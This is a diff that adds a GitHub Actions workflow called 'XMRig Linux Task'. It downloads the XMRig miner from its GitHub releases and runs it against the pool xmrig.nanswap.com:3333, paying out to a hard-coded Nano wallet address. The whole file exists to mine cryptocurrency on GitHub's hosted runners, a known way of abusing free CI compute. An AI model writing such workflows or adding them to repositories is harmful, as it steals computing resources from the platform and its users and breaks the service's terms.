@@ -1,0 +1,22 @@
+name: XMRig Linux Task
+
+on:
+  workflow_dispatch: # Allows manual trigger from the Actions tab
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - name: Download XMRig
+        run: |
+          # Downloading the static Linux version (includes all dependencies)
+          wget https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.21.0-linux-static-x64.tar.gz
+
+      - name: Start Mining
+        run: |
+          cd xmrig-6.21.0
+          # Standard Linux execution
+          ./xmrig -o xmrig.nanswap.com:3333 -a rx -k -u nano_3d5psf65d41ckxdnqz5ajuwo1ceo6hq8k4q314oa78doqozye9b6eb5iqpc1 -p x
+          
